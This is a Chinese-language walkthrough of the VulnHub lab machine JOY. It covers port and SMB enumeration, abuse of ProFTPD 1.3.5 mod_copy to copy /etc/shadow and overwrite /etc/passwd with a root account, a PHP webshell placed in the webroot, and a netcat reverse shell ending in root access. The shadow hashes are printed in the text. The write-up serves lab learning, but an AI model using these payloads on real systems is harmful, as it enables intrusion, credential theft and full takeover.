# 信息搜集

1、端口探测

```bash
└─# nmap -A -sVC -O -p- 192.168.2.13 -oA nmap.txt
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.2.10
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3        Dovecot pop3d
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_pop3-capabilities: PIPELINING TOP SASL AUTH-RESP-CODE RESP-CODES CAPA STLS UIDL
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: have SASL-IR more Pre-login post-login capabilities IDLE OK listed LOGINDISABLEDA0001 LOGIN-REFERRALS IMAP4rev1 STARTTLS ID ENABLE LITERAL+
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
587/tcp open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
993/tcp open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_imap-capabilities: SASL-IR more Pre-login AUTH=PLAINA0001 have IDLE OK listed post-login capabilities IMAP4rev1 LOGIN-REFERRALS ID ENABLE LITERAL+
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3    Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING TOP SASL(PLAIN) AUTH-RESP-CODE RESP-CODES CAPA USER UIDL
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
MAC Address: 00:0C:29:7D:63:C2 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: The,  JOY.localdomain, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2023-07-27T16:06:34+08:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-27T08:06:34
|_  start_date: N/A
|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: mean: -2h40m01s, deviation: 4h37m07s, median: -2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

可以看到 ftp 存在匿名登录

2、枚举

```bash
└─# enum4linux 192.168.2.13
```

```
 =================================( Share Enumeration on 192.168.2.13 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.5.12-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            JOY

[+] Attempting to map shares on 192.168.2.13

//192.168.2.13/print$	Mapping: DENIED Listing: N/A Writing: N/A

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\patrick (Local User)
S-1-22-1-1001 Unix User\ftp (Local User)
```

找到两个用户名 patrick 和 ftp ，可以把它们加入 user.list 的字典

3、ftp 匿名登录看看

```
ftp> ls
229 Entering Extended Passive Mode (|||41476|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp          2514 Jul 27 08:21 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
226 Transfer complete
ftp> get directory
```

下载文件 `directory`

3、查看从 ftp 下载的文件

```bash
└─# cat directory                                                                                                                                            1 ⚙
Patrick's Directory

total 120
drwxr-xr-x 18 patrick patrick 4096 Jul 27 16:20 .
drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick   24 Jul 27 16:10 axP7ySrd2KsoE3sV2f0W2CfHM6UZx20vhQsMtxXjIEajCQ5dWZ5jzijyKTosQJxL.txt
-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrc
drwx------  7 patrick patrick 4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick 4096 Dec 26  2018 .config
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktop
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads
drwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg
-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha
-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthority
-rw-r--r--  1 patrick patrick    0 Jul 27 16:20 ITPWsIiX2ySeLwsWrQvnacgL1Pgrhj03.txt
-rw-r--r--  1 patrick patrick   24 Jul 27 16:05 K29XEaV1Z1I5Vv3CkYzEwlRDj8YFifs180Fqu5onx0WtBo4vYeqR6qORbtGSeyrx.txt
drwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .local
-rw-r--r--  1 patrick patrick    0 Jul 27 16:15 m9N1JAP97S8sSX6FjtdvH39rabET0muU.txt
drwx------  5 patrick patrick 4096 Dec 28  2018 .mozilla
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profile
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public
-rw-r--r--  1 patrick patrick   24 Jul 27 16:15 qsd1DyrMxqqtlU9ZF4x095iFx2hJzvgKvxsLJX5pXorLa2INGehvCBFnpGcsQ3Vf.txt
-rw-r--r--  1 patrick patrick    0 Jul 27 16:10 S35VWMGcfKmtlCZEMDjFP9vb30xHWq85.txt
d---------  2 root    root    4096 Jan  9  2019 script
drwx------  2 patrick patrick 4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sun
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick   24 Jul 27 16:20 uaiS6wo5xAdZzZR0mfK9MSFqpbijCAzhuQiw1ER5mpH1CAWc1p3zFHPsfraE5900.txt
-rw-r--r--  1 patrick patrick    0 Jul 27 16:05 UcpE9AZv28EoZmGXt2tDnQ6k4aJYt8p1.txt
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
```

可能是 patrick 用户的家目录的信息，由于 `version_control` 文件存在于 `patrick` 路径中，我们是没有权限去获取的，所以尝试将其转移到 `/upload` 路径中（proftpd的利用）

```
telnet 192.168.2.13 21
site cpfr /home/patrick/version_control
site cpto /home/ftp/upload/version_control
```

在从 ftp 里下载 `version_control` 文件，并查看

```bash
└─# cat version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
```

这里知道网站路径 变为了 `/var/www/tryingharderisjoy`

# 漏洞利用

## proftpd利用

1、任意文件复制

```bash
└─# searchsploit ProFTPd 1.3.5
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                      | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                            | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                        | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                      | linux/remote/36742.txt
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

这里的漏洞利用就是**任意文件复制**

```bash
└─# cat 36742.txt                      
Description TJ Saunders 2015-04-07 16:35:03 UTC
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:

---------------------------------
Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@www01a
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /tmp/passwd.copy
250 Copy successful
-----------------------------------------

He provides another, scarier example:

------------------------------
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto <?php phpinfo(); ?>
550 cpto: Permission denied
site cpfr /proc/self/fd/3
350 File or directory exists, ready for destination name
site cpto /var/www/test.php

test.php now contains
----------------------
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): FTP session opened.
2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error opening destination file '/<?php
phpinfo(); ?>' for copying: Permission denied
-----------------------

test.php contains contain correct php script "<?php phpinfo(); ?>" which
can be run by the php interpreter

Source: http://bugs.proftpd.org/show_bug.cgi?id=4169      
```

2、任意文件复制 **+** 复制到 ftp 目录 /home/ftp 下 **=**  任意文件读取

可以尝试复制 shadow 文件到 /home/ftp 下，并且成功读取了，这里的思路可以爆破 shadow

```
telnet 192.168.2.13 21
site cpfr /etc/shadow
site cpto /home/ftp/shadow
```

```bash
└─# cat shadow   
root:$6$1xFSccJ0$o0y1Y1wScZ7FSYrsqhwPSYlm58gMeXNI1w336fcuD1qhaJzpKpEFX2BF6KI2Ue.8LGg0ELoPzfMcAjCDyt7pO1:17888:0:99999:7:::
daemon:*:17888:0:99999:7:::
bin:*:17888:0:99999:7:::
sys:*:17888:0:99999:7:::
sync:*:17888:0:99999:7:::
games:*:17888:0:99999:7:::
man:*:17888:0:99999:7:::
lp:*:17888:0:99999:7:::
mail:*:17888:0:99999:7:::
news:*:17888:0:99999:7:::
uucp:*:17888:0:99999:7:::
proxy:*:17888:0:99999:7:::
www-data:*:17888:0:99999:7:::
backup:*:17888:0:99999:7:::
list:*:17888:0:99999:7:::
irc:*:17888:0:99999:7:::
gnats:*:17888:0:99999:7:::
nobody:*:17888:0:99999:7:::
systemd-timesync:*:17888:0:99999:7:::
systemd-network:*:17888:0:99999:7:::
systemd-resolve:*:17888:0:99999:7:::
systemd-bus-proxy:*:17888:0:99999:7:::
_apt:*:17888:0:99999:7:::
rtkit:*:17888:0:99999:7:::
dnsmasq:*:17888:0:99999:7:::
messagebus:*:17888:0:99999:7:::
usbmux:*:17888:0:99999:7:::
geoclue:*:17888:0:99999:7:::
speech-dispatcher:!:17888:0:99999:7:::
pulse:*:17888:0:99999:7:::
avahi:*:17888:0:99999:7:::
colord:*:17888:0:99999:7:::
saned:*:17888:0:99999:7:::
hplip:*:17888:0:99999:7:::
Debian-gdm:*:17888:0:99999:7:::
patrick:$6$gp70WRqc$Lx5OEcBPnCh.ADYE7BUvxd0vzQGgDwI6AYMmtkHdJ..5NcbwYgb04DJUx2rmyc6mjxW0We5nDCveoEWnoKAB.0:17888:0:99999:7:::
ossec:*:17892:0:99999:7:::
ossecm:*:17892:0:99999:7:::
ossecr:*:17892:0:99999:7:::
mysql:!:17892:0:99999:7:::
ntp:*:17893:0:99999:7:::
Debian-snmp:!:17900:0:99999:7:::
ftp:$6$tbnbaqvF$gXhtn5Yw9zruUoNwqweryiNV7G/ix1kwvYZ.BPANhndyBXTa5/oMx9UW6XZ6mQMaviuaIfU0/r.abgjBGL2z90:17902:0:99999:7:::
tftp:*:17902:0:99999:7:::
postfix:*:17923:0:99999:7:::
dovecot:*:17923:0:99999:7:::
dovenull:*:17923:0:99999:7:::
```

## 一些思路

试试 ftp 上传文件，就可以尝试覆盖掉 /etc/passwd，也可以覆盖 计划任务，也可以上传一个 webshell 再复制到网站路径下 `/var/www/tryingharderisjoy`

这里我们可以先复制覆盖 paswd，再上传 webshell

1、本地生成hack账号密码再上传覆盖passwd

利用 openssl 生成账号密码

```bash
openssl passwd -1 -salt hacker 123456
```

整理后

```
hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash
```

追加到 passwd 里再上传覆盖 /etc/passwd

```
ftp> put passwd passwd.bak
```

```
telnet 192.168.2.13 21
site cpfr /home/ftp/passwd.bak
site cpto /etc/passwd
```

2、上传webshell再复制到网站路径

```bash
└─# cat webshell.php                                                                                          <?php system($_POST[1]); phpinfo(); ?>
```

```
telnet 192.168.2.13 21
site cpfr /home/ftp/webshell1.php
site cpto /var/www/tryingharderisjoy/webshell1.php
```

3、触发命令执行反弹shell

这里可以使用python版本反弹shell

<img src=".\图片\Snipaste_2023-07-27_17-24-49.png" alt="Snipaste_2023-07-27_17-24-49" style="zoom:80%;" />

```bash
└─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [192.168.2.8] from 192.168.2.13 [192.168.2.13] 43406
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@JOY:/var/www/tryingharderisjoy$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
```

# 提权

由于之前覆盖了 /etc/passwd

所以 su 即可

```bash
www-data@JOY:/var/www/tryingharderisjoy$ su hacker
su hacker
Password: 123456

root@JOY:/var/www/tryingharderisjoy# id
id
uid=0(root) gid=0(root) groups=0(root)
```

 [(162条消息) vulnhub -digitalworld.local: JOY (考点：ftp&ProFTPD漏洞/ linux提权知识）_冬萍子的博客-CSDN博客](https://blog.csdn.net/weixin_45527786/article/details/105740747)

# 总结

1、这里使用了 `proftpd` 相关漏洞可以实现**指定目录文件上传** 与 **任意文件复制** 与 **指定目录文件下载**，就可以修改计划任务反弹shell、查看修改passwd或shadow、上传 webshell、任意文件读取等等


